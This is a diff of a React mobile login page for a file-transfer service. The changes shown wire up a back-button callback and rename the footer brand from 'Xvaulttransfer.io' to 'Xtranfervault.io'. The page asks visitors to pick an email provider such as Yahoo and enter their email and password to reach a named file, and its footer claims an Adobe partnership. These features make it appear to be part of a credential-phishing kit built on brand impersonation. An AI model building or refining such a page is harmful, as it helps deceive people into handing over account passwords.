@@ -5,7 +5,7 @@ import Spinner from '../../components/common/Spinner';
 
 interface LoginPageProps {
   fileName: string;
-  onBack: () => void;
+  onBack: () => void; // This was missing
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
   onYahooSelect?: () => void;
@@ -16,7 +16,7 @@ interface LoginPageProps {
 
 const MobileLoginPage: React.FC<LoginPageProps> = ({ 
   fileName,
-  onBack,
+  onBack, // Added here
   onLoginSuccess,
   onLoginError,
   onYahooSelect,
@@ -54,7 +54,8 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
     setSelectedProvider(null);
     setEmail('');
     setPassword('');
-    resetLoginState(); // This is the added line
+    resetLoginState();
+    onBack(); // This was the missing call
   };
 
   const handleProviderClick = (providerName: string) => {
@@ -89,7 +90,6 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
       }}
     >
       {!selectedProvider ? (
-        // --- Provider Selection without Container Card ---
         <>
           <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
             <div className="flex justify-center mb-4">
@@ -124,12 +124,11 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
               ))}
             </div>
             <div className="mt-8 text-center">
-              <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2026 Xvaulttransfer.io. Secured in partnership with Adobe®.</p>
+              <p className="text-sm text-gray-800 font-semibold drop-shadow-[0_1px_2px_rgba(255,255,255,0.7)]">© 2026 Xtranfervault.io. Secured in partnership with Adobe®.</p>
             </div>
           </div>
         </>
       ) : (
-        // --- Login Form with Container ---
         <>
           <div className="bg-white/50 backdrop-blur-sm p-6 text-center">
             <div className="flex justify-center mb-4">
@@ -173,7 +172,7 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
             </form>
           </div>
           <div className="bg-white/30 backdrop-blur-sm pt-2 pb-4">
-            <p className="text-xs text-gray-600 text-center">© 2026 Xvaulttransfer.io. Secured in partnership with Adobe®.</p>
+            <p className="text-xs text-gray-600 text-center">© 2026 Xtranfervault.io. Secured in partnership with Adobe®.</p>
           </div>
         </>
       )}
